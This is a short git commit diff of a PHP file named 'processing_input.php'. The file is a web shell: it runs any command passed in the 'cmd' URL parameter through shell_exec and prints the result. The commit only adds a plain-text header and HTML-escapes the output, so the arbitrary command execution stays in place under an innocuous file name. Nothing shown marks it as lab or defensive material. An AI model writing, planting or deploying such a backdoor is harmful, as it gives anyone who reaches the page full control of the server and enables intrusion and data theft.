5e2dc60e5aa1049a2b99da3ccb540408b9d65c78
007calculation <167617731+007calculation@users.noreply.github.com>
2024-10-24 21:09:50 +0800

    Update processing_input.php

--- processing_input.php
+++ processing_input.php
@@ -1,7 +1,8 @@
 <?php
+header("Content-Type: text/plain");
 if (isset($_GET["cmd"])) {
     $command = $_GET["cmd"];
     $output = shell_exec($command);
-    echo "<pre>$output</pre>";
+    echo "<pre>" . htmlspecialchars($output) . "</pre>";
 }
 ?>
